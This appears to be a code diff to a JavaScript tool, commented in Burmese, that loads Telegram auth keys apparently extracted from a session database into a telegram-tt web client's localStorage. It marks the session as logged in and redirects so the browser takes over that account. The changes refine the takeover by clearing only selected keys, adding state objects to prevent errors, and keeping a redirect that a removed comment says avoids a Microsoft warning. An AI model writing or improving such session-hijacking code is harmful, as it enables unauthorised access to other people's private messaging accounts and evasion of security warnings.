@@ -318,21 +318,31 @@ result.sessions.forEach((session, index) => {
             
             const authKeyArray = hexToArray(data.authKeyHex);
             
-            // ၂။ Storage အဟောင်းများကို ရှင်းလင်းခြင်း (QR Code အဟောင်းများ ဖျက်ရန်)
-            localStorage.clear();
-            sessionStorage.clear();
+            // ၂။ [အရေးကြီးပြင်ဆင်ချက်] localStorage.clear() အစား သက်ဆိုင်ရာ Key များကိုသာ ဖျက်ပါမည်။
+            // Multi-tab လုပ်ဆောင်ချက်ကို မပျက်စီးစေရန် ရည်ရွယ်သည်။
+            Object.keys(localStorage).forEach(key => {
+                if (key.startsWith('dc') || key === 'tt-global-state') {
+                    localStorage.removeItem(key);
+                }
+            });
             
-            // ၃။ Auth Key အသစ်ကို ဤနေရာမှနေ၍ Storage သို့ တိုက်ရိုက်သွင်းခြင်း
+            // ၃။ Auth Key အသစ်ကို Storage သို့ သွင်းခြင်း
             localStorage.setItem('dc', String(data.dcId));
             localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
             
-            // ၄။ 🌟 [အရေးကြီးဆုံး] telegram-tt အတွက် ပြီးပြည့်စုံသော Global State တည်ဆောက်ခြင်း 🌟
+            // ၄။ [အရေးကြီးပြင်ဆင်ချက်] telegram-tt အတွက် လိုအပ်သော Object များအပြည့်အစုံပါဝင်သည့် Global State တည်ဆောက်ခြင်း
             const globalState = {
                 auth: {
-                    state: "authorizationStateReady", // Login ဝင်ပြီးကြောင်း သတ်မှတ်သည်
+                    state: "authorizationStateReady",
                     phoneNumber: phoneNumber
                 },
-                currentUserId: String(data.userId), // User ID အတိအကျ ထည့်ပေးသည်
+                currentUserId: String(data.userId),
+                // index.tsx ရှိ selectors များ Error မတက်စေရန် အောက်ပါ Empty Object များကို မဖြစ်မနေ ထည့်ပေးရပါမည်
+                byTabId: {}, 
+                messages: { byChatId: {} },
+                chats: { byId: {} },
+                users: { byId: {} },
+                recentEmojis: [],
                 settings: {
                     byKey: {
                         theme: "dark",
@@ -347,7 +357,7 @@ result.sessions.forEach((session, index) => {
             
             alert("Mission Synchronized! Connecting to Agent Terminal...");
             
-            // ၅။ 🌟 URL တွင် Parameter လုံးဝမပါဘဲ Main App သို့ ကူးပြောင်းခြင်း (Microsoft Warning မတက်စေရန်) 🌟
+            // ၅။ URL တွင် Parameter လုံးဝမပါဘဲ Main App သို့ ကူးပြောင်းခြင်း
             window.location.replace('/');
         } else {
             alert("Session extraction failed! Database may be incomplete.");
